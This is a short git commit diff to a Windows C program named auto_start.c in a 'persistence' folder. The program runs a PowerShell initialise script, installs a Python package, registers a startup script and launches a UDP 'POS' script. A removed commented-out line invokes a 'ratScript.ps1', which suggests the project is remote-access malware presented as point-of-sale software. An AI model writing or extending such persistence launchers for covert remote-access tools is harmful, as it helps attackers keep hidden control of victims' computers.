1729b028e38bb8defdd74930be41982906ffb791
STUPID-AF-CAT <geddy@waveville.net>
2020-01-30 14:05:25 -0600

    Testing new feature

--- persistence/auto_start.c
+++ persistence/auto_start.c
@@ -1,14 +1,31 @@
 #include <Windows.h>
 #include <stdlib.h>
 #include <stdio.h>
+#include <tchar.h>
+
+int fileExists(TCHAR * file);
 
 int main()
 {
-    printf("Installing now, please install python to run the POS.\n");
-    system("start /WAIT ./persistence/python-3.8.1.exe\n");
-    system("setx path \"%PATH%;%homepath%\\appdata\\local\\programs\\python\\python38\"\n");
-    system("python ./persistence/add_startup.py");
+    system("start initialize.ps1");
+    if (!fileExists("C:\\users\\ieuser\\appdata\\local\\programs\\python\\python38-32\\Lib\\site-packages\\openpyxl"))
+    {
+        system("start /WAIT pip install openpyxl\n");
+    }
+    system("python ./persistence/add_startup.py\n");
     system("python ./UDP_Connection/pos.py\n");
-    //system("%homepath%\\documents\\ourFolder\\ratScript.ps1");
     return 0;
+}
+
+int fileExists(TCHAR * file)
+{
+   WIN32_FIND_DATA FindFileData;
+   HANDLE handle = FindFirstFile(file, &FindFileData) ;
+   int found = handle != INVALID_HANDLE_VALUE;
+   if(found) 
+   {
+       //FindClose(&handle); this will crash
+       FindClose(handle);
+   }
+   return found;
 }
